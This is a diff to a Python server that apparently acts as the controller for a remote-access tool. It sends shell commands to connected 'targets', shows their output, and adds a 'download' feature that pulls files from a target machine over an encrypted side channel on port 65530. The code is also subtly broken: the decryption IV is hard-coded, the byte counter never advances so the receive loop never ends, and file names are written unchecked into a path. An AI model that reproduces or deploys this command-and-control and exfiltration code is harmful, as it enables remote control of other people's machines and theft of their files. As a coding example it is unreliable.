@@ -5,6 +5,8 @@ from time import sleep
 import rsa
 import subprocess, os
 from datetime import datetime
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
 
 SECONDS_RANGE = 5
 MAX_MESSAGES_PER_SECOND = 1   # 5 messages in SECONDS_RANGE seconds
@@ -47,15 +49,22 @@ def target_handler():
                     continue
 
             while cmd != "exit":
-                sleep(0.5)
+                sleep(0.5)      # avoid prompt being printed before command's output
                 cmd = input(f"\r{target['nickname']} $: ")
+                header = "/output,"
+
                 if cmd == "exit":
                     break
-                cmd = "/output," + cmd
+                elif cmd.startswith("download "):
+                    cmd = cmd[9:]           # cmd becomes the file name
+                    header = "/foutput,"     # means the body is the name of the file to download
+
+                cmd = header + cmd
                 try:
-                    send_message(cmd, target)
+                    send_message(cmd, target)   # client should connect to receiver socket
                 except OSError:
                     cmd = "exit"
+                
 
         elif cmd == "help":
             print("\t\t\t Print connected users \r ls")
@@ -194,17 +203,102 @@ def target_handler():
                         colored(f"\r {time}", "white", attrs=["dark"]) + colored(f" {nick.strip()}:", "white")
                     )
 
+def wait_for_files():
+    HOST = ''
+    PORT = 65530
+
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+        sock.bind((HOST, PORT))
+        sock.listen(1)
+        sock.settimeout(2)
+
+        while not stop_server:
+            try:
+                conn, addr = sock.accept()
+            except (TimeoutError, socket.timeout):
+                continue
+            
+            Thread(target=receive_file, args=(conn,)).start()
+
+
+def receive_file(conn : socket.socket):
+    global RSA_KEY_LEN, private_key
+    # receive AES key
+    key = rsa.decrypt( conn.recv(int(RSA_KEY_LEN/8)), private_key )
+    BUF_SIZE = 66560
+
+    conn.settimeout(None)
+    
+    msg = conn.recv(BUF_SIZE)
+    fname = decrypt_message(key, msg).decode('utf-8', errors='ignore')
+
+    msg = conn.recv(BUF_SIZE)
+    fsize = decrypt_message(key, msg).decode('utf-8', errors='ignore')
+    fsize = int(fsize)
+
+    GB = 1024**3
+    MB = 1024**2
+    KB = 1024
+    UNIT = "B"
+    unit = 1
+    if fsize > GB:
+        UNIT = "GB"
+        unit = GB
+    elif fsize > MB:
+        UNIT = "MB"
+        unit = MB
+    elif fsize > KB:
+        UNIT = "KB"
+        unit = KB
+
+    bytes_received = 0
+    unit = 1
+    start = datetime.now()
+    f = open(f"downloads/{fname}", "wb")
+    while bytes_received < fsize:
+        packet = decrypt_message( key, conn.recv(BUF_SIZE) )
+        if not packet:
+            break
+
+        percentage = int( bytes_received/fsize * 100 )
+
+        bar = (f"\r{percentage}% |>") + colored("-" * int( percentage/2 ), "yellow") + (" " * (50 - int(percentage/2) )) + "<| " + str( int(bytes_received/unit) ) + f"{UNIT}/" + str(int(fsize/unit)) + f"{UNIT}"
+        print(bar, end="")
+        f.write(packet)
+
+    f.close()
+    bar = (f"\r100% |>") + colored("-" * 100, "yellow") + "<|" + str(int(fsize/unit)) + f"{UNIT}/" + str(int(fsize/unit)) + f"{UNIT}"
+    print(bar, end="")
+
+    finish = datetime.now()
+    print(f"\n{finish-start}")
+    
+    return
+
+def encrypt_message(key : bytes, message : bytes):
+    iv = get_random_bytes(AES.block_size)
+    cipher = AES.new(key, AES.MODE_CFB, iv)
+    ciphertext = cipher.encrypt(message)
+    return (iv + ciphertext)
+
+def decrypt_message(key : bytes, ciphertext : bytes):
+    iv = b"qwertykiolsksocd"
+    cipher = AES.new(key, AES.MODE_CFB, iv)
+    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
+    return plaintext
+
 # Send message to specified client
 def send_message(data, client):
     client["conn"].sendall( rsa.encrypt(data.encode(), client["key"]) )
 
 def handle_connection(client : dict, conn : socket.socket = None):
-    global private_key, RSA_KEY_LEN, stop_thread, stop_server
+    global private_key, RSA_KEY_LEN, stop_thread, stop_server, file_name
 
     conn = client["conn"]
     addr = client["addr"]
     conn.settimeout(None)
 
+    # --- Wating for nickname
     try:
         nickname = rsa.decrypt(conn.recv(int(RSA_KEY_LEN/8)), private_key).decode('utf-8', errors='ignore')
         if nickname == "/None":     # "/None" means operation aborted
@@ -231,19 +325,26 @@ def handle_connection(client : dict, conn : socket.socket = None):
 
     conn.settimeout(1)
     
+    # --- Waiting for messages
     try:
         print(colored(f'[+] {addr} - {nickname} connected', "green"), "\n$: ", end="")
-        # Wait for messages
+
         while not stop_server:
             try:
-                data = rsa.decrypt(conn.recv(int(RSA_KEY_LEN/8)), private_key).decode('utf-8', errors='ignore')    # 128 max bytes decryptable with 1024 rsa key
+                # keep it bytes to avoid errors when receiving files
+                data = rsa.decrypt(conn.recv(int(RSA_KEY_LEN/8)), private_key)
             except (TimeoutError, socket.timeout):
                 if client["banned"]:
-                    data = "random"
+                    data = "random"     # this way the program exits instead of continuing
                 else:
                     continue
 
             if not data: continue
+
+            data = data.decode('utf-8', errors='ignore')  
+            if data.startswith("/fname,"):
+                file_name = data[7:]
+                continue
 
             if data.startswith("/output,"):
                 print(data[8:], end="")
@@ -360,10 +461,13 @@ def main():
     stop_thread = False
     stop_server = False
 
+    global file_name
+    file_name = "recv.txt"
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.bind((HOST, PORT))
         print(colored("=> Server started", "green"))
+        Thread(target=wait_for_files).start()
         s.settimeout(2)
         try:
             target_thread = Thread(target=target_handler)
